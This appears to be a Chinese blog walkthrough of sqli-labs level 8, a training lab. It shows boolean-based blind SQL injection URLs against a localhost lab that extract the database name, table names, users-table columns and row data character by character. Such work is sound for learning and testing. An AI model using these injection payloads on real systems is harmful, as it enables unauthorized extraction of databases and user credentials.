    <h1 class="article-title" itemprop="name">
      sqli-labs关卡/sqli-labs第八关GET盲注
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">确定当前字符长度。</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8--+</span><br><span class="line">我们发现字符长度为8的时候返回you are in 表示长度为8</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584324918160.png" alt="1584324918160"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看当前库名，使用sacii码，发现115返回you are in 其他编码不显示，115ascii编码对应的是s经过向后测试，测出库名为security。</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1))&#x3D;115--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584324757710.png" alt="1584324757710"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们再来查看当前表名</span><br><span class="line">我们查询了第一个表发现ascii是101，101对应的ascii是e相同步骤更改,1,1的第一个数据向后测试，测试出的结果第一个表名是emali，测试第二个表名时更改limit 0,1的第一个数字0，以此类推</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584325563927.png" alt="1584325563927"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们测试出了表名，发现有emails、referers、uagents、users，其中users就是我们想要的</span><br><span class="line">我们来查看users里面有什么字段</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select  column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105--+</span><br><span class="line">我们看到ascii码为105是返回正常，105对应的ascii是i然后经过测试这个字段是id，其他字段是password，username</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584325878093.png" alt="1584325878093"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们来查看表数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+</span><br><span class="line">我们查看了当前id的第一个字母对应的ascii是49，49对应的字母是1，以此类推，可以查看出其他的字段数据</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326020353.png" alt="1584326020353"></p>
